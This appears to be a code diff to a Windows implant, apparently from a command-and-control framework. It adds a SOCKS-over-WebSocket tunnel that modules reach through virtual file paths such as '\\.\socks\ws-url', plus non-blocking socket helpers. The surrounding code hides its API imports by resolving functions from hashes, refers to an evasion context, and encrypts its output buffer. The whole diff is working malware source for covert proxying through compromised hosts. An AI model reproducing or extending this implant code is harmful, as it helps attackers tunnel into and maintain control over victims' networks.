@@ -13,7 +13,10 @@
 #include "crypto.h"
 #include "bus.h"
 #include "peb.h"
+#include "comms.h"
+#include "comms_ws.h"
 #include "sleep.h"
+#include "task_exec.h"
 
 #ifdef TEST_BUILD
 #ifndef AF_INET
@@ -27,6 +30,71 @@ typedef struct _SOCKADDR {
     char sa_data[14];
 } SOCKADDR;
 #endif
+
+__attribute__((weak))
+DWORD task_socks_inbox_read(BYTE *buf, DWORD len) {
+    (void)buf;
+    (void)len;
+    return 0;
+}
+
+__attribute__((weak))
+NTSTATUS comms_tcp_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len) {
+    (void)ctx; (void)data; (void)len;
+    return STATUS_UNSUCCESSFUL;
+}
+
+__attribute__((weak))
+NTSTATUS comms_tcp_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *received) {
+    (void)ctx; (void)buf; (void)buf_len;
+    if (received) *received = 0;
+    return STATUS_UNSUCCESSFUL;
+}
+
+__attribute__((weak))
+NTSTATUS comms_tcp_close(COMMS_CONTEXT *ctx) {
+    (void)ctx;
+    return STATUS_SUCCESS;
+}
+
+__attribute__((weak))
+NTSTATUS comms_tls_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len) {
+    (void)ctx; (void)data; (void)len;
+    return STATUS_UNSUCCESSFUL;
+}
+
+__attribute__((weak))
+NTSTATUS comms_tls_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *received) {
+    (void)ctx; (void)buf; (void)buf_len;
+    if (received) *received = 0;
+    return STATUS_UNSUCCESSFUL;
+}
+
+__attribute__((weak))
+NTSTATUS comms_tls_close(COMMS_CONTEXT *ctx) {
+    (void)ctx;
+    return STATUS_SUCCESS;
+}
+
+__attribute__((weak))
+DWORD ws_build_frame(WS_CONTEXT *ctx, BYTE opcode, BOOL fin,
+                     const BYTE *payload, DWORD payload_len,
+                     BYTE *output, DWORD output_len) {
+    (void)ctx; (void)opcode; (void)fin; (void)payload; (void)payload_len;
+    (void)output; (void)output_len;
+    return 0;
+}
+
+__attribute__((weak))
+DWORD ws_parse_frame(const BYTE *wire_data, DWORD wire_len, WS_FRAME *frame) {
+    (void)wire_data; (void)wire_len; (void)frame;
+    return 0;
+}
+
+__attribute__((weak))
+void ws_apply_mask(BYTE *data, DWORD data_len, const BYTE mask_key[4]) {
+    (void)data; (void)data_len; (void)mask_key;
+}
 #endif
 
 /* ------------------------------------------------------------------ */
@@ -34,6 +102,26 @@ typedef struct _SOCKADDR {
 /* ------------------------------------------------------------------ */
 
 static BUS_CONTEXT g_bus_ctx;
+
+/* SOCKS interactive WebSocket virtual file state.  Modules access this
+ * through "\\.\socks\ws-url", "\\.\socks\ws", and "\\.\socks\ws-close"
+ * so the public module ABI stays stable. */
+#define SOCKS_WS_MAX_HOST       256
+#define SOCKS_WS_MAX_PATH       512
+#define SOCKS_WS_RX_BUF_SIZE    WS_RECV_BUF_SIZE
+
+typedef struct _SOCKS_WS_STATE {
+    WS_CONTEXT ws;
+    BOOL       connected;
+    BOOL       use_tls;
+    char       host[SOCKS_WS_MAX_HOST];
+    char       host_header[SOCKS_WS_MAX_HOST + 8];
+    char       path[SOCKS_WS_MAX_PATH];
+    BYTE       rx_buf[SOCKS_WS_RX_BUF_SIZE];
+    DWORD      rx_len;
+} SOCKS_WS_STATE;
+
+static SOCKS_WS_STATE g_socks_ws;
 
 /* ------------------------------------------------------------------ */
 /*  Forward declarations for bus API implementations                   */
@@ -83,6 +171,11 @@ static BOOL      bus_output_slot6(const BYTE *data, DWORD len, DWORD type);
 static BOOL      bus_output_slot7(const BYTE *data, DWORD len, DWORD type);
 static PVOID     bus_resolve(const char *dll_name, const char *func_name);
 static void      bus_log(DWORD level, const char *msg);
+
+static BOOL      socks_ws_connect_url(const BYTE *data, DWORD len);
+static BOOL      socks_ws_send_frame(const BYTE *data, DWORD len);
+static DWORD     socks_ws_recv_frame(BYTE *buf, DWORD len);
+static BOOL      socks_ws_close(void);
 
 /* ------------------------------------------------------------------ */
 /*  Helper: get evasion context from the bus context                   */
@@ -254,6 +347,50 @@ DWORD output_drain(OUTPUT_RING *ring, BYTE *dest, DWORD dest_len) {
     return drained;
 }
 
+DWORD output_drain_one(OUTPUT_RING *ring, BYTE *dest, DWORD dest_len) {
+    if (!ring || !dest || dest_len == 0 || ring->count < sizeof(OUTPUT_ENTRY_HDR))
+        return 0;
+
+    BYTE enc_hdr_buf[sizeof(OUTPUT_ENTRY_HDR)];
+    for (DWORD i = 0; i < sizeof(OUTPUT_ENTRY_HDR); i++) {
+        enc_hdr_buf[i] = ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE];
+    }
+
+    OUTPUT_ENTRY_HDR hdr;
+    spec_chacha20_encrypt(ring->enc_key, ring->enc_nonce,
+                          ring->tail / CHACHA20_BLOCK_SIZE,
+                          enc_hdr_buf, sizeof(OUTPUT_ENTRY_HDR),
+                          (BYTE *)&hdr);
+
+    DWORD total = sizeof(OUTPUT_ENTRY_HDR) + hdr.len;
+    if (hdr.len > BUS_OUTPUT_ENTRY_MAX || total > ring->count || hdr.len > dest_len)
+        return 0;
+
+    BYTE enc_entry[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
+    for (DWORD i = 0; i < total; i++) {
+        enc_entry[i] = ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE];
+    }
+
+    BYTE plain_entry[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
+    spec_chacha20_encrypt(ring->enc_key, ring->enc_nonce,
+                          ring->tail / CHACHA20_BLOCK_SIZE,
+                          enc_entry, total, plain_entry);
+
+    spec_memcpy(dest, plain_entry + sizeof(OUTPUT_ENTRY_HDR), hdr.len);
+
+    for (DWORD i = 0; i < total; i++) {
+        ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE] = 0;
+    }
+
+    ring->tail = (ring->tail + total) % BUS_OUTPUT_RING_SIZE;
+    ring->count -= total;
+    if (ring->count == 0)
+        ring->encrypted = FALSE;
+
+    spec_memset(plain_entry, 0, total);
+    return hdr.len;
+}
+
 /* ------------------------------------------------------------------ */
 /*  bus_init — populate function table, init output ring               */
 /* ------------------------------------------------------------------ */
@@ -410,7 +547,11 @@ static BOOL bus_mem_protect(PVOID ptr, SIZE_T size, DWORD perms) {
 #define HASH_SEND_BUS           0x7C9DDB4F  /* "send"         */
 #define HASH_RECV_BUS           0x7C9D4D95  /* "recv"         */
 #define HASH_CLOSESOCKET_BUS    0x494CB104  /* "closesocket"  */
+#define HASH_SELECT_BUS         0x1B80E3C5  /* "select"       */
+#define HASH_IOCTLSOCKET_BUS    0x06DCD609  /* "ioctlsocket"  */
 #define HASH_LOGONUSERW         0xE4328B5A  /* "LogonUserW"   */
+
+#define FIONBIO_BUS             0x8004667E
 
 /* ws2_32.dll and advapi32.dll module hashes (may already be defined
    from comms.h or sleep.h in unity build) */
@@ -439,6 +580,52 @@ static PVOID bus_resolve_ws2(void) {
 
     char ws2_name[] = {'w','s','2','_','3','2','.','d','l','l',0};
     return pLoadLib(ws2_name);
+}
+
+typedef struct _BUS_FD_SET {
+    unsigned int fd_count;
+    ULONG_PTR fd_array[64];
+} BUS_FD_SET;
+
+typedef struct _BUS_TIMEVAL {
+    long tv_sec;
+    long tv_usec;
+} BUS_TIMEVAL;
+
+static BOOL bus_socket_readable(ULONG_PTR sock) {
+    PVOID ws2 = bus_resolve_ws2();
+    if (!ws2 || sock == 0 || sock == INVALID_SOCKET)
+        return FALSE;
+
+    typedef int (__attribute__((stdcall)) *fn_select_t)(
+        int, BUS_FD_SET *, BUS_FD_SET *, BUS_FD_SET *, const BUS_TIMEVAL *);
+    fn_select_t pSelect = (fn_select_t)find_export_by_hash(ws2, HASH_SELECT_BUS);
+    if (!pSelect)
+        return FALSE;
+
+    BUS_FD_SET readfds;
+    BUS_TIMEVAL tv;
+    spec_memset(&readfds, 0, sizeof(readfds));
+    spec_memset(&tv, 0, sizeof(tv));
+    readfds.fd_count = 1;
+    readfds.fd_array[0] = sock;
+
+    return pSelect(0, &readfds, NULL, NULL, &tv) > 0;
+}
+
+static void bus_socket_set_nonblocking(ULONG_PTR sock) {
+    PVOID ws2 = bus_resolve_ws2();
+    if (!ws2 || sock == 0 || sock == INVALID_SOCKET)
+        return;
+
+    typedef int (__attribute__((stdcall)) *fn_ioctlsocket_t)(ULONG_PTR, long, ULONG *);
+    fn_ioctlsocket_t pIoctl =
+        (fn_ioctlsocket_t)find_export_by_hash(ws2, HASH_IOCTLSOCKET_BUS);
+    if (!pIoctl)
+        return;
+
+    ULONG mode = 1;
+    (void)pIoctl(sock, FIONBIO_BUS, &mode);
 }
 
 static HANDLE bus_net_connect(const char *addr, DWORD port, DWORD proto) {
@@ -504,6 +691,7 @@ static HANDLE bus_net_connect(const char *addr, DWORD port, DWORD proto) {
         return INVALID_HANDLE_VALUE;
     }
 
+    bus_socket_set_nonblocking(sock);
     return (HANDLE)sock;
 }
 
@@ -812,12 +1000,396 @@ static BOOL bus_build_nt_path(const char *path, WCHAR *wbuf,
 }
 
 /* ------------------------------------------------------------------ */
+/*  SOCKS WebSocket virtual file endpoint                              */
+/* ------------------------------------------------------------------ */
+
+static BOOL bus_path_equals(const char *path, const char *want) {
+    DWORD i = 0;
+    if (!path || !want)
+        return FALSE;
+    while (path[i] || want[i]) {
+        if (path[i] != want[i])
+            return FALSE;
+        i++;
+    }
+    return TRUE;
+}
+
+static DWORD bus_uint_to_str(DWORD val, char *buf, DWORD buf_size) {
+    char tmp[12];
+    DWORD pos = 0;
+    DWORD out = 0;
+
+    if (!buf || buf_size == 0)
+        return 0;
+    if (val == 0) {
+        if (buf_size < 2)
+            return 0;
+        buf[0] = '0';
+        buf[1] = 0;
+        return 1;
+    }
+    while (val > 0 && pos < sizeof(tmp)) {
+        tmp[pos++] = (char)('0' + (val % 10));
+        val /= 10;
+    }
+    while (pos > 0 && out + 1 < buf_size)
+        buf[out++] = tmp[--pos];
+    buf[out] = 0;
+    return out;
+}
+
+static BOOL __attribute__((unused))
+socks_ws_parse_url(const char *url, char *host, DWORD host_len,
+                               char *host_header, DWORD host_header_len,
+                               char *path, DWORD path_len,
+                               DWORD *port_out, BOOL *use_tls_out) {
+    DWORD pos = 0, hpos = 0, ppos = 0;
+    DWORD port = 0;
+    BOOL explicit_port = FALSE;
+    BOOL use_tls = FALSE;
+
+    if (!url || !host || !host_header || !path || !port_out || !use_tls_out)
+        return FALSE;
+
+    if (url[0] == 'w' && url[1] == 's' && url[2] == 's' &&
+        url[3] == ':' && url[4] == '/' && url[5] == '/') {
+        use_tls = TRUE;
+        port = 443;
+        pos = 6;
+    } else if (url[0] == 'w' && url[1] == 's' &&
+               url[2] == ':' && url[3] == '/' && url[4] == '/') {
+        use_tls = FALSE;
+        port = 80;
+        pos = 5;
+    } else if (url[0] == 'h' && url[1] == 't' && url[2] == 't' &&
+               url[3] == 'p' && url[4] == 's' &&
+               url[5] == ':' && url[6] == '/' && url[7] == '/') {
+        use_tls = TRUE;
+        port = 443;
+        pos = 8;
+    } else if (url[0] == 'h' && url[1] == 't' && url[2] == 't' &&
+               url[3] == 'p' && url[4] == ':' && url[5] == '/' && url[6] == '/') {
+        use_tls = FALSE;
+        port = 80;
+        pos = 7;
+    } else {
+        return FALSE;
+    }
+
+    while (url[pos] && url[pos] != ':' && url[pos] != '/' && url[pos] != '?') {
+        if (hpos + 1 >= host_len)
+            return FALSE;
+        host[hpos++] = url[pos++];
+    }
+    host[hpos] = 0;
+    if (hpos == 0)
+        return FALSE;
+
+    if (url[pos] == ':') {
+        explicit_port = TRUE;
+        pos++;
+        port = 0;
+        while (url[pos] >= '0' && url[pos] <= '9') {
+            port = port * 10 + (DWORD)(url[pos] - '0');
+            pos++;
+        }
+        if (port == 0 || port > 65535)
+            return FALSE;
+    }
+
+    if (url[pos] == '/') {
+        while (url[pos]) {
+            if (ppos + 1 >= path_len)
+                return FALSE;
+            path[ppos++] = url[pos++];
+        }
+    } else if (url[pos] == '?') {
+        if (path_len < 2)
+            return FALSE;
+        path[ppos++] = '/';
+        while (url[pos]) {
+            if (ppos + 1 >= path_len)
+                return FALSE;
+            path[ppos++] = url[pos++];
+        }
+    } else {
+        path[ppos++] = '/';
+    }
+    path[ppos] = 0;
+
+    if (hpos + 1 >= host_header_len)
+        return FALSE;
+    spec_memcpy(host_header, host, hpos);
+    host_header[hpos] = 0;
+    if (explicit_port) {
+        char port_str[8];
+        DWORD port_len = bus_uint_to_str(port, port_str, sizeof(port_str));
+        if (hpos + 1 + port_len + 1 >= host_header_len)
+            return FALSE;
+        host_header[hpos++] = ':';
+        spec_memcpy(host_header + hpos, port_str, port_len);
+        hpos += port_len;
+        host_header[hpos] = 0;
+    }
+
+    *port_out = port;
+    *use_tls_out = use_tls;
+    return TRUE;
+}
+
+static NTSTATUS socks_ws_wire_send(const BYTE *data, DWORD len) {
+    if (g_socks_ws.ws.tls.socket == 0 || g_socks_ws.ws.tls.socket == INVALID_SOCKET)
+        return STATUS_UNSUCCESSFUL;
+    if (g_socks_ws.use_tls)
+        return comms_tls_send(&g_socks_ws.ws.tls, data, len);
+    return comms_tcp_send(&g_socks_ws.ws.tls, data, len);
+}
+
+static NTSTATUS socks_ws_wire_recv(BYTE *buf, DWORD len, DWORD *received) {
+    if (g_socks_ws.ws.tls.socket == 0 || g_socks_ws.ws.tls.socket == INVALID_SOCKET)
+        return STATUS_UNSUCCESSFUL;
+    if (!bus_socket_readable(g_socks_ws.ws.tls.socket)) {
+        *received = 0;
+        return STATUS_SUCCESS;
+    }
+    if (g_socks_ws.use_tls)
+        return comms_tls_recv(&g_socks_ws.ws.tls, buf, len, received);
+    return comms_tcp_recv(&g_socks_ws.ws.tls, buf, len, received);
+}
+
+static BOOL socks_ws_close(void) {
+    if (!g_socks_ws.connected) {
+        spec_memset(&g_socks_ws, 0, sizeof(g_socks_ws));
+        return TRUE;
+    }
+
+    {
+        BYTE close_payload[2] = { (BYTE)(WS_CLOSE_NORMAL >> 8),
+                                  (BYTE)(WS_CLOSE_NORMAL & 0xFF) };
+        DWORD close_len = ws_build_frame(&g_socks_ws.ws, WS_OPCODE_CLOSE, TRUE,
+                                         close_payload, sizeof(close_payload),
+                                         g_socks_ws.ws.send_buf, WS_SEND_BUF_SIZE);
+        if (close_len > 0)
+            (void)socks_ws_wire_send(g_socks_ws.ws.send_buf, close_len);
+    }
+
+    if (g_socks_ws.use_tls)
+        comms_tls_close(&g_socks_ws.ws.tls);
+    else
+        comms_tcp_close(&g_socks_ws.ws.tls);
+    spec_memset(&g_socks_ws, 0, sizeof(g_socks_ws));
+    return TRUE;
+}
+
+static BOOL socks_ws_connect_url(const BYTE *data, DWORD len) {
+#ifdef TEST_BUILD
+    (void)data;
+    (void)len;
+    return FALSE;
+#else
+    char url[SOCKS_WS_MAX_PATH + SOCKS_WS_MAX_HOST];
+    DWORD copy_len;
+    DWORD port = 0;
+    IMPLANT_CONTEXT *ictx;
+    COMMS_CONTEXT *base;
+    NTSTATUS status;
+    DWORD req_len;
+    DWORD received = 0;
+
+    if (!data || len == 0)
+        return FALSE;
+    copy_len = len;
+    if (copy_len >= sizeof(url))
+        copy_len = sizeof(url) - 1;
+    spec_memcpy(url, data, copy_len);
+    url[copy_len] = 0;
+
+    socks_ws_close();
+    spec_memset(&g_socks_ws, 0, sizeof(g_socks_ws));
+
+    if (!socks_ws_parse_url(url, g_socks_ws.host, sizeof(g_socks_ws.host),
+                            g_socks_ws.host_header, sizeof(g_socks_ws.host_header),
+                            g_socks_ws.path, sizeof(g_socks_ws.path),
+                            &port, &g_socks_ws.use_tls))
+        return FALSE;
+
+    ictx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
+    if (!ictx || !ictx->comms_ctx)
+        return FALSE;
+    base = (COMMS_CONTEXT *)ictx->comms_ctx;
+    if (!base->api.resolved)
+        return FALSE;
+
+    g_socks_ws.ws.ws_state = WS_STATE_DISCONNECTED;
+    g_socks_ws.ws.state = COMMS_STATE_DISCONNECTED;
+    g_socks_ws.ws.prng_state = 0xC0DEC0DE;
+    g_socks_ws.ws.tls.socket = INVALID_SOCKET;
+    spec_memcpy(&g_socks_ws.ws.tls.api, &base->api, sizeof(COMMS_API));
+    g_socks_ws.ws.tls.wsa_initialized = base->wsa_initialized;
+
+    status = comms_tcp_connect(&g_socks_ws.ws.tls, g_socks_ws.host, port);
+    if (!NT_SUCCESS(status))
+        goto fail;
+    g_socks_ws.ws.ws_state = WS_STATE_TCP_CONNECTED;
+
+    if (g_socks_ws.use_tls) {
+        if (!g_socks_ws.ws.tls.api.tls_available)
+            goto fail;
+        status = comms_tls_init(&g_socks_ws.ws.tls);
+        if (!NT_SUCCESS(status))
+            goto fail;
+        status = comms_tls_handshake(&g_socks_ws.ws.tls, g_socks_ws.host);
+        if (!NT_SUCCESS(status))
+            goto fail;
+        g_socks_ws.ws.ws_state = WS_STATE_TLS_CONNECTED;
+    }
+
+    ws_generate_key(&g_socks_ws.ws);
+    req_len = ws_build_upgrade_request(&g_socks_ws.ws,
+                                       g_socks_ws.host_header,
+                                       g_socks_ws.path,
+                                       g_socks_ws.ws.handshake_buf,
+                                       WS_HANDSHAKE_BUF_SIZE);
+    if (req_len == 0)
+        goto fail;
+    status = socks_ws_wire_send(g_socks_ws.ws.handshake_buf, req_len);
+    if (!NT_SUCCESS(status))
+        goto fail;
+    status = g_socks_ws.use_tls
+        ? comms_tls_recv(&g_socks_ws.ws.tls, g_socks_ws.ws.handshake_buf,
+                         WS_HANDSHAKE_BUF_SIZE - 1, &received)
+        : comms_tcp_recv(&g_socks_ws.ws.tls, g_socks_ws.ws.handshake_buf,
+                         WS_HANDSHAKE_BUF_SIZE - 1, &received);
+    if (!NT_SUCCESS(status) || received == 0)
+        goto fail;
+    g_socks_ws.ws.handshake_buf[received] = 0;
+    if (!ws_validate_upgrade_response(&g_socks_ws.ws,
+                                      g_socks_ws.ws.handshake_buf, received))
+        goto fail;
+
+    g_socks_ws.ws.ws_state = WS_STATE_UPGRADED;
+    g_socks_ws.ws.state = COMMS_STATE_REGISTERED;
+    g_socks_ws.connected = TRUE;
+    g_socks_ws.rx_len = 0;
+    return TRUE;
+
+fail:
+    if (g_socks_ws.use_tls && g_socks_ws.ws.tls.context_valid)
+        comms_tls_close(&g_socks_ws.ws.tls);
+    else
+        comms_tcp_close(&g_socks_ws.ws.tls);
+    spec_memset(&g_socks_ws, 0, sizeof(g_socks_ws));
+    return FALSE;
+#endif
+}
+
+static BOOL socks_ws_send_frame(const BYTE *data, DWORD len) {
+    DWORD frame_len;
+    if (!g_socks_ws.connected || !data || len == 0)
+        return FALSE;
+    frame_len = ws_build_frame(&g_socks_ws.ws, WS_OPCODE_BINARY, TRUE,
+                               data, len, g_socks_ws.ws.send_buf,
+                               WS_SEND_BUF_SIZE);
+    if (frame_len == 0)
+        return FALSE;
+    if (!NT_SUCCESS(socks_ws_wire_send(g_socks_ws.ws.send_buf, frame_len))) {
+        socks_ws_close();
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static DWORD socks_ws_recv_frame(BYTE *buf, DWORD len) {
+    DWORD received = 0;
+    DWORD consumed;
+    WS_FRAME frame;
+
+    if (!g_socks_ws.connected || !buf || len == 0)
+        return 0;
+
+    for (;;) {
+        consumed = ws_parse_frame(g_socks_ws.rx_buf, g_socks_ws.rx_len, &frame);
+        if (consumed > 0)
+            break;
+
+        if (g_socks_ws.rx_len >= sizeof(g_socks_ws.rx_buf))
+            return 0;
+        if (!NT_SUCCESS(socks_ws_wire_recv(g_socks_ws.rx_buf + g_socks_ws.rx_len,
+                                           sizeof(g_socks_ws.rx_buf) - g_socks_ws.rx_len,
+                                           &received)) || received == 0)
+            return 0;
+        g_socks_ws.rx_len += received;
+    }
+
+    if (frame.masked)
+        ws_apply_mask(frame.payload, frame.payload_len, frame.mask_key);
+
+    if (frame.opcode == WS_OPCODE_PING) {
+        DWORD pong_len = ws_build_frame(&g_socks_ws.ws, WS_OPCODE_PONG, TRUE,
+                                        frame.payload, frame.payload_len,
+                                        g_socks_ws.ws.send_buf, WS_SEND_BUF_SIZE);
+        if (pong_len > 0)
+            (void)socks_ws_wire_send(g_socks_ws.ws.send_buf, pong_len);
+        goto shift_and_empty;
+    }
+    if (frame.opcode == WS_OPCODE_CLOSE) {
+        socks_ws_close();
+        return 0;
+    }
+    if (frame.opcode != WS_OPCODE_BINARY || frame.payload_len > len)
+        goto shift_and_empty;
+
+    spec_memcpy(buf, frame.payload, frame.payload_len);
+    received = frame.payload_len;
+
+    {
+        DWORD remain = g_socks_ws.rx_len - consumed;
+        DWORD i;
+        for (i = 0; i < remain; i++)
+            g_socks_ws.rx_buf[i] = g_socks_ws.rx_buf[consumed + i];
+        g_socks_ws.rx_len = remain;
+    }
+    return received;
+
+shift_and_empty:
+    {
+        DWORD remain = g_socks_ws.rx_len - consumed;
+        DWORD i;
+        for (i = 0; i < remain; i++)
+            g_socks_ws.rx_buf[i] = g_socks_ws.rx_buf[consumed + i];
+        g_socks_ws.rx_len = remain;
+    }
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
 /*  File API implementations                                           */
 /* ------------------------------------------------------------------ */
 
 static DWORD bus_file_read(const char *path, BYTE *buf, DWORD len) {
     if (!path || !buf || len == 0)
         return 0;
+
+    if (bus_path_equals(path, "\\\\.\\socks\\ws"))
+        return socks_ws_recv_frame(buf, len);
+
+    {
+        char socks_inbox[] = {
+            '\\','\\','.','\\','s','o','c','k','s','\\','i','n','b','o','x',0
+        };
+        DWORD i = 0;
+        BOOL match = TRUE;
+        while (socks_inbox[i] || path[i]) {
+            if (socks_inbox[i] != path[i]) {
+                match = FALSE;
+                break;
+            }
+            i++;
+        }
+        if (match)
+            return task_socks_inbox_read(buf, len);
+    }
 
     WCHAR wpath[BUS_MAX_PATH_WCHARS];
     UNICODE_STRING us_path;
@@ -860,6 +1432,13 @@ static BOOL bus_file_write(const char *path, const BYTE *data, DWORD len) {
     if (!path || !data || len == 0)
         return FALSE;
 
+    if (bus_path_equals(path, "\\\\.\\socks\\ws-url"))
+        return socks_ws_connect_url(data, len);
+    if (bus_path_equals(path, "\\\\.\\socks\\ws"))
+        return socks_ws_send_frame(data, len);
+    if (bus_path_equals(path, "\\\\.\\socks\\ws-close"))
+        return socks_ws_close();
+
     WCHAR wpath[BUS_MAX_PATH_WCHARS];
     UNICODE_STRING us_path;
     if (!bus_build_nt_path(path, wpath, &us_path))
@@ -899,6 +1478,10 @@ static BOOL bus_file_write(const char *path, const BYTE *data, DWORD len) {
 static BOOL bus_file_delete(const char *path) {
     if (!path)
         return FALSE;
+
+    if (bus_path_equals(path, "\\\\.\\socks\\ws") ||
+        bus_path_equals(path, "\\\\.\\socks\\ws-close"))
+        return socks_ws_close();
 
     WCHAR wpath[BUS_MAX_PATH_WCHARS];
     UNICODE_STRING us_path;
